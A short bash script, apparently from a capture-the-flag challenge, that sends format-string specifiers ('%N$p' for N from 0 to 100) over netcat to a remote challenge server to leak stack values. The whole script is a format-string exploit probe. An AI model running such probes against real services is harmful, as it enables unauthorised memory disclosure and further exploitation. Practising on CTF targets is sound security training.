#!/bin/bash

for i in {0..100}
do
	echo "%$i\$p" | nc shell.actf.co 21820
done